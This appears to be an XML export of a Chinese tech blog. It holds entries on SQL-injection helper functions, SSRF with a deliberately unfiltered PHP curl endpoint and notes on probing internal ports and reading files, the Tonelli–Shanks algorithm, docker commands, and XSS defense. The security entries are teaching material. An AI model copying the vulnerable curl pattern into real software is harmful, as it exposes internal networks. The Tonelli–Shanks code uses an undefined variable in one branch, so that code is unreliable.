<td style="text-align:center">left()</td>
<td style="text-align:center">返回字符串的最左边几个字符</td>
</tr>
<tr>
<td style="text-align:center">floor</td>
<td style="text-align:center">返回小于或等于x的最大整数</td>
</tr>
<tr>
<td style="text-align:center">rand</td>
<td style="text-align:center">返回0和1之间的随机数</td>
</tr>
<tr>
<td style="text-align:center">extractvalue()</td>
<td style="text-align:center">第一个参数：XML document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath string（Xpath格式的字符串） 作用：从目标XML中返回包含所查询值的字符串</td>
</tr>
<tr>
<td style="text-align:center">updatexml()</td>
<td style="text-align:center">第一个参数：XML document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath string（Xpath格式的字符串） 第三个参数：new value String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值</td>
</tr>
<tr>
<td style="text-align:center">sleep()</td>
<td style="text-align:center">让此语句运行N秒钟</td>
</tr>
<tr>
<td style="text-align:center">if()</td>
<td style="text-align:center">SELECT IF(1&gt;2.2.3) -&gt; 3 类似三目运算</td>
</tr>
<tr>
<td style="text-align:center">char()</td>
<td style="text-align:center">返回整数ASCII代码字符组成的字符串</td>
</tr>
<tr>
<td style="text-align:center">STRCMP()</td>
<td style="text-align:center">比较字符串内容</td>
</tr>
<tr>
<td style="text-align:center">IFNULL()</td>
<td style="text-align:center">假如参数1不为NUL,则返回值为参数1,否则其返回值为参数2</td>
</tr>
<tr>
<td style="text-align:center">exp()</td>
<td style="text-align:center">返回e的x次方</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞原理及利用</title>
    <url>/2021/07/05/ssrf-lou-dong-yuan-li-ji-li-yong/</url>
    <content><![CDATA[<blockquote>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/91819069">SSRF漏洞攻击原理及防御方案</a></p>
</blockquote>
<img src="/2021/07/05/ssrf-lou-dong-yuan-li-ji-li-yong/ssrf.png" class>
<center>图源：https://www.freebuf.com/articles/web/260806.html</center>

<span id="more"></span>
<h1 id="SSRF概念"><a href="#SSRF概念" class="headerlink" title="SSRF概念"></a>SSRF概念</h1><p><strong>服务端请求伪造(Server-Side Request Forgery)</strong>,指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
<h1 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h1><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。一般情况下， SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
<h1 id="SSRF主要攻击方式"><a href="#SSRF主要攻击方式" class="headerlink" title="SSRF主要攻击方式"></a>SSRF主要攻击方式</h1><p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息。</p>
<p><img src="https://pic2.zhimg.com/v2-bca50003926a87fdd4be2c30d1828d70_1440w.jpg" alt></p>
<center>图源：https://pic2.zhimg.com/v2-bca50003926a87fdd4be2c30d1828d70_1440w.jpg</center>



<h1 id="SSRF危害"><a href="#SSRF危害" class="headerlink" title="SSRF危害"></a>SSRF危害</h1><ol>
<li>访问内网文件识别web指纹</li>
<li>探测内网主机存活，应用，端口</li>
<li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li>
<li>攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）</li>
<li>利用file协议读取本地文件等</li>
<li>攻击内网应用程序，如redis</li>
</ol>
<h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>正常用法（应该吧）：</p>
<img src="/2021/07/05/ssrf-lou-dong-yuan-li-ji-li-yong/231349.png" class>
<img src="/2021/07/05/ssrf-lou-dong-yuan-li-ji-li-yong/230046.png" class>
<h2 id="利用file协议读取文件"><a href="#利用file协议读取文件" class="headerlink" title="利用file协议读取文件"></a>利用file协议读取文件</h2><img src="/2021/07/05/ssrf-lou-dong-yuan-li-ji-li-yong/230823.png" class>
<h2 id="探测内网开放端口"><a href="#探测内网开放端口" class="headerlink" title="探测内网开放端口"></a>探测内网开放端口</h2><p>端口开放（回显）：</p>
<img src="/2021/07/05/ssrf-lou-dong-yuan-li-ji-li-yong/231910.png" class>
<p>端口未开放：</p>
<img src="/2021/07/05/ssrf-lou-dong-yuan-li-ji-li-yong/232140.png" class>
<h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><ol>
<li><p>过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
</li>
<li><p>统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。</p>
</li>
<li><p>限制请求的端口，比如80,443,8080,8090。</p>
</li>
<li><p>禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。</p>
</li>
<li><p>使用DNS缓存或者Host白名单的方式。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Tonelli–Shanks Algorithm</title>
    <url>/2020/06/01/tonelli-shanks-algorithm/</url>
    <content><![CDATA[<blockquote>
<p>参考：<a href="http://en.wikipedia.org/wiki/Tonelli–Shanks_algorithm">http://en.wikipedia.org/wiki/Tonelli%E2%80%93Shanks_algorithm</a></p>
</blockquote>
<p>Tonelli–Shanks算法是一个求解二次平方根的算法</p>
<script type="math/tex; mode=display">
x^2 \equiv n \pmod p</script><p>其中n是p的二次剩余，p为奇素数</p>
<span id="more"></span>
<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>输入:</p>
<ul>
<li>p,一个素数</li>
<li>n,一个模p的二次剩余</li>
</ul>
<p>输出:</p>
<ul>
<li>r, $ r^2 \equiv n \pmod p $</li>
</ul>
<p>算法:</p>
<ol>
<li>从p-1分解出2的幂次，即有:p-1=Q*2^S，其中Q是奇素数。如果S=1，即$p \equiv 3 \pmod 4$，然后直接返回$r \equiv \pm n^{\frac{p+1}{4}}$。</li>
<li>计算z，使得其满足L(z,p)=-1，令 $c \equiv z^Q$</li>
<li>令 $r \equiv n^{\frac{Q+1}{2}} , t \equiv n^Q , m = s$</li>
<li>循环：<ul>
<li>如果$t\equiv 1$，返回r</li>
<li>否则，找到最小的一个i(0&lt;i&lt;m)，且$t^{2i} \equiv 1$</li>
<li>令 $b \equiv c^{2^{m-i-1}}$，再令 $r\equiv br$,$t\equiv tb^2$,$c\equiv b^2$,$m=i$</li>
</ul>
</li>
</ol>
<p>如果得到一个解r，另一个解就是p-r</p>
<h1 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h1><p>首先有p-1=Q*2^S，令$r\equiv n^{\frac{Q+1}{2}}\pmod{p}, t\equiv n^Q\pmod p$，注意到有$r^2\equiv nt\pmod p$，这一同余式在每次循环中都保持正确；如果在某一时间点，$t \equiv 1\pmod p$，则有$r^2\equiv n\pmod p$，于是就找到n的二次平方根$R\equiv \pm r\pmod p$</p>
<p>如果$t!\equiv 1\pmod p$，那就考虑二次非剩余z；令$c\equiv z^Q\pmod p$，然后就有$c^{2^S}\equiv {(z^Q)}^{2^S}\equiv z^{2^SQ}\equiv z^{p-1}\equiv 1\pmod p$，并且$c^{2^{S-1}}\equiv z^{\frac{p-1}{2}}\equiv -1 \pmod p$，这意味着c的阶是$2^S$</p>
<p>类似地，$t^{2^S}\equiv 1\pmod p$，故t的阶能整除$2^S$；假设t的阶是$2^{S’}$，由于n是模p的二次剩余，$S’\leq S-1$</p>
<p>现在令$b \equiv c^{2^{m-i-1}}\pmod p$,$r’\equiv br\pmod p$,$c’\equiv b^2\pmod p$,$t’\equiv c’t\pmod p$,和之前一样，${r’}^2\equiv nt’ \pmod p$任然成立；然而现在的t和c’的阶数都是$2^{S’}$，这意味着t’的阶数$2^{S’’}$满足$S’’&lt;S’$</p>
<p>如果$s’’\equiv 0\pmod p$，则$t’\equiv 1\pmod p$，算法终止，返回$R\equiv \pm r’\pmod p$，否则重新执行循环，定义$b’,r’’,c’’,t’’$……直到停止；由于S序列严格递减，算法一定会结束</p>
<h1 id="实现-python"><a href="#实现-python" class="headerlink" title="实现(python)"></a>实现(python)</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">legendre</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    symbol <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token keyword">if</span> symbol <span class="token operator">==</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">return</span> symbol

<span class="token keyword">def</span> <span class="token function">tonelli</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> legendre<span class="token punctuation">(</span>a<span class="token punctuation">,</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    q <span class="token operator">=</span> p <span class="token operator">-</span> <span class="token number">1</span>
    s <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> q <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        q <span class="token operator">//=</span> <span class="token number">2</span>
        s <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    
    z <span class="token operator">=</span> <span class="token number">2</span>
    <span class="token keyword">while</span> legendre<span class="token punctuation">(</span>z<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        z <span class="token operator">+=</span> <span class="token number">1</span>
        
    m <span class="token operator">=</span> s
    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    t <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span>q <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    
    <span class="token keyword">while</span> t<span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        t2 <span class="token operator">=</span> t
        i <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> t2 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token keyword">and</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">:</span>
            t2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>t2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
        b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
        m <span class="token operator">=</span> i
        c <span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> p
        t <span class="token operator">=</span> <span class="token punctuation">(</span>t <span class="token operator">*</span> c<span class="token punctuation">)</span> <span class="token operator">%</span> p
        r <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> p
        
    <span class="token keyword">return</span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>python</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/2021/06/14/docker-chang-yong-ming-ling/</url>
    <content><![CDATA[<h1 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h1><p>参考：</p>
<blockquote>
<p><a href="https://www.runoob.com/docker/docker-command-manual.html">https://www.runoob.com/docker/docker-command-manual.html</a></p>
</blockquote>
<span id="more"></span>
<h2 id="镜像的操作"><a href="#镜像的操作" class="headerlink" title="镜像的操作"></a>镜像的操作</h2><p>1.拉取镜像到本地</p>
<pre class="line-numbers language-none"><code class="language-none">docker pull [OPTIONS] NAME[:TAG|@DIGEST]
    无tag时，默认为latest
    OPTIONS说明：
        -a :拉取所有 tagged 镜像
        --disable-content-trust :忽略镜像的校验,默认开启
    eg:
    docker pull ubuntu:18.04 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>2.查看本地全部镜像</p>
<pre class="line-numbers language-none"><code class="language-none">docker images [OPTIONS] [REPOSITORY[:TAG]]
    OPTIONS说明：
        -a:列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；
        --digests:显示镜像的摘要信息；
        -f:显示满足条件的镜像；
        --format:指定返回值的模板文件；
        --no-trunc:显示完整的镜像信息；
        -q:只显示镜像ID。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>3.删除本地镜像</p>
<pre class="line-numbers language-none"><code class="language-none">docker rmi [OPTIONS] IMAGE [IMAGE...]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="容器的操作"><a href="#容器的操作" class="headerlink" title="容器的操作"></a>容器的操作</h2><p>1.创建和启动一个新的容器</p>
<pre class="line-numbers language-none"><code class="language-none">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]
    IMAGE:镜像名称，run操作的是镜像images
    COMMAND:命令，可选
    OPTIONS:（常用）
    	-d:后台运行容器，并返回容器ID；
    	-i:以交互模式运行容器，通常与 -t 同时使用；
    	-P:随机端口映射，容器内部端口随机映射到主机的端口
    	-p:指定端口映射，格式为：主机(宿主)端口:容器端口
    	-t:为容器重新分配一个伪输入终端，通常与 -i 同时使用；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>2.进入到容器内部</p>
<pre class="line-numbers language-none"><code class="language-none">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]
    CONTAINER:容器名称或ID，必选，看出exec操作的对象是容器
    COMMAND:命令，必选<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>3.连接到正在运行的容器</p>
<pre class="line-numbers language-none"><code class="language-none">docker attach [OPTIONS] CONTAINER
    CONTAINER:容器名称或ID，必选，attach的操作对象也是容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>三者区别：</p>
<blockquote>
<ul>
<li>docker run；创建和启动一个新的容器实例，操作对象是镜像，选项较多，如果你要创建和启动一个容器，只能用run；</li>
<li>docker exec: 在已运行的容器中，执行命令，操作对象是容器，如果你要进入已运行的容器，并且执行命令，用exec；</li>
<li>docker attach: 同样操作的是已运行的容器，可以将本机标准输入（键盘输入）输到容器中，也可以将容器的输出显示在本机的屏幕上，如果你想查看容器运行过程中产生的标准输入输出，用attach；</li>
</ul>
<p><a href="https://blog.csdn.net/MePlusPlus/article/details/92822329">https://blog.csdn.net/MePlusPlus/article/details/92822329</a></p>
</blockquote>
<p>4.删除容器（删除容器之前，先停止容器）</p>
<pre class="line-numbers language-none"><code class="language-none">docker rm [OPTIONS] CONTAINER [CONTAINER...]
    OPTIONS说明：
        -f:通过 SIGKILL 信号强制删除一个运行中的容器。
        -l:移除容器间的网络连接，而非容器本身。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>5.启动/停止/重启容器</p>
<pre class="line-numbers language-none"><code class="language-none">docker start [OPTIONS] CONTAINER [CONTAINER...]
docker stop [OPTIONS] CONTAINER [CONTAINER...]
docker restart [OPTIONS] CONTAINER [CONTAINER...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>6.列出容器</p>
<pre class="line-numbers language-none"><code class="language-none">docker ps [OPTIONS]
	OPTIONS说明：
        -a:显示所有的容器，包括未运行的。
        -f:根据条件过滤显示的内容。
        --format:指定返回值的模板文件。
        -l:显示最近创建的容器。
        -n:列出最近创建的n个容器。
        --no-trunc:不截断输出。
        -q:静默模式，只显示容器编号。
        -s:显示总的文件大小。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>命令</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS原理及防御</title>
    <url>/2021/06/24/xss-yuan-li-ji-fang-yu/</url>
    <content><![CDATA[<blockquote>
<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
</blockquote>
<span id="more"></span>
<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>XSS全称是Cross Site Scripting（为了和CSS进行区分，就叫XSS）即跨站脚本，是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h2><p>反射型 XSS 的攻击步骤：</p>
<ol>
<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
<li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li>
<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p>
<p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>
<p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型 XSS 的攻击步骤：</p>
<ol>
<li>攻击者将恶意代码提交到目标网站的数据库中。</li>
<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
<p>反射型 XSS 跟存储型 XSS 的区别是：反射型 XSS 的恶意代码存在 URL 里，存储型 XSS 的恶意代码存在数据库里。</p>
<h2 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h2><p>DOM 型 XSS 的攻击步骤：</p>
<ol>
<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
<li>用户打开带有恶意代码的 URL。</li>
<li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><p>常用的XSS攻击手段和目的有：</p>
<ol>
<li><p>盗用cookie，获取敏感信息。</p>
</li>
<li><p>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</p>
</li>
<li><p>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>
</li>
<li><p>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>
</li>
<li><p>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果</p>
</li>
</ol>
<h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><h2 id="防御XSS的七条原则"><a href="#防御XSS的七条原则" class="headerlink" title="防御XSS的七条原则"></a>防御XSS的七条原则</h2><ol>
<li>不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</li>
<li>在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</li>
<li>在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</li>
<li>在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</li>
<li>在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</li>
<li>在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</li>
<li>使用富文本时，使用XSS规则引擎进行编码过滤</li>
</ol>
<h2 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h2><p><code>HttpOnly</code> 最早是由微软提出，并在 <code>IE 6</code> 中实现的，至今已经逐渐成为一个标准，各大浏览器都支持此标准。具体含义就是，如果某个 <code>Cookie</code> 带有 <code>HttpOnly</code> 属性，那么这一条 <code>Cookie</code> 将被禁止读取，也就是说，<code>JavaScript</code> 读取不到此条 <code>Cookie</code>，不过在与服务端交互的时候，<code>Http Request</code> 包中仍然会带上这个 <code>Cookie</code> 信息，即我们的正常交互不受影响。</p>
<h2 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h2><p><strong>记住一点：不要相信任何输入的内容。</strong></p>
<p>无论是不是做了安全校验，都必须进行过滤操作，而且需要后台配合过滤，如果后端的检查校验还做得不好，那就可能被攻破。</p>
<p>输入检查在更多的时候被用于格式检验，例如用户名只能以字母和数字组合，手机号码只能有 11 位且全部为数字，否则即为非法。</p>
<p>这些格式检查类似于白名单效果，限制输入允许的字符，让一下特殊字符的攻击失效。</p>
<p>目前网上有很多开源的 <code>XSS Filter</code> ，这些 <code>XSS Filter</code> 目前来说还是有些效果的，能只能检验输入内容，高级一点的还会匹配 <code>XSS</code> 特征，例如内容是否包含了 <code>&lt;script&gt;</code>，<code>javascript</code> 等敏感字符，但是这些 <code>XSS Filter</code> 只是获取到了用户的输入内容，并不了解其上下文含义，很多时候会误过滤。</p>
<h2 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h2><p>不要以为在输入的时候进行过滤就万事大吉了，恶意攻击者们可能会层层绕过防御机制进行 <code>XSS</code> 攻击，一般来说，所有需要输出到 <code>HTML</code> 页面的变量，全部需要使用编码或者转义来防御。</p>
<h3 id="HTMLEncode"><a href="#HTMLEncode" class="headerlink" title="HTMLEncode"></a>HTMLEncode</h3><p>针对 <code>HTML</code> 代码的编码方式是 <code>HTMLEncode</code>，它的作用是将字符串转换成 <code>HTMLEntities</code>。</p>
<p>目前来说，为了对抗 <code>XSS</code> ，以下转义内容是必不可少的：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>特殊字符</th>
<th>实体编码</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;</td>
<td><code>&amp;amp;</code></td>
</tr>
<tr>
<td>&lt;</td>
<td><code>&amp;lt;</code></td>
</tr>
<tr>
<td>&gt;</td>
<td><code>&amp;gt;</code></td>
</tr>
<tr>
<td>“</td>
<td><code>&amp;quot;</code></td>
</tr>
<tr>
<td>‘</td>
<td><code>&amp;#x27;</code></td>
</tr>
<tr>
<td>/</td>
<td><code>&amp;#x2F;</code></td>
</tr>
</tbody>
</table>
</div>
<h3 id="JavaScriptEncode"><a href="#JavaScriptEncode" class="headerlink" title="JavaScriptEncode"></a>JavaScriptEncode</h3><p><code>JavaScriptEncode</code> 与 <code>HTMLEncode</code> 的编码方式不同，它需要用 <code>\</code> 对特殊字符进行转义。</p>
<p>在对抗 <code>XSS</code> 时，还要求输出的变量必须在引号内部，以免造成安全问题，可是很多开发者并没有这种习惯，这样只能使用更为严格的 <code>JavaScriptEncode</code> 来保证数据安全：除了数字，字符之外的所有字符，小于127的字符编码都使用十六进制 <code>\xHH</code> 的方式进行编码，大于用unicode（非常严格模式）。</p>
<h1 id="正确的防御-XSS"><a href="#正确的防御-XSS" class="headerlink" title="正确的防御 XSS"></a>正确的防御 XSS</h1><p><code>XSS</code> 的本质还是一种 <code>HTML 注入</code>，用户的数据被当成了 <code>HTML</code> 代码一部分来执行，从而混淆了原本的语意，产生了新的语意。</p>
<p>如果网站使用了 <code>MVC(MVVM)</code> 结构，那么 <code>XSS</code> 就会发生在 <code>View</code> 层，也就是变量拼接到页面时产生的，所以在用户提交数据的时候进行输入检查，并不是真正在被攻击的地方做防御.</p>
<p>想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。</p>
